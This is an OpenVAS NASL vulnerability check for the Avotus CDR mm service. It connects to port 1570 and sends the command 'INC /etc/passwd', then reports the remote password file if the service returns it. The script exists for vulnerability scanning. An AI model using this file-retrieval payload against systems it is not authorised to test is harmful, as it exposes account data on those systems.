# OpenVAS Vulnerability Test
# $Id: avotus_mm.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: Avotus mm File Retrieval attempt
#
# Authors:
# Anonymous
#
# Copyright:
# Copyright (C) 2004 Anonymous
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The script attempts to force the remote Avotus CDR mm service to include 
the file /etc/passwd across the network.";

tag_solution = "The vendor has provided a fix for this issue to all customers.
The fix will be included in future shipments and future versions of the product.
If an Avotus customer has any questions about this problem, they should contact
support@avotus.com.";

if(description)
{
 script_id(11948);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 name = "Avotus mm File Retrieval attempt";
 script_name(name);
 
 
 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("Anonymous");
		
 family = "Remote file access";
 script_family(family);
 script_dependencies("find_service.nasl");
 script_require_ports(1570, "Services/avotus_mm");
 
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("misc_func.inc");

cmd = string("INC /etc/passwd\n");


port = get_kb_item("Services/avotus_mm");
if(!port)port = 1570;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  send(socket:soc, data:cmd);
  res = recv(socket:soc, length:65535);
  if(egrep(pattern:"root:.*:0:[01]:", string:res))
   {
    report =  "
The Avotus CDR mm service allows any file to be retrieved remotely.
Here is an excerpt from the remote /etc/passwd file : 
" + res + "

Solution: disable this service";

   security_message(port:port, data:report);
   }
  close(soc);
  }
}

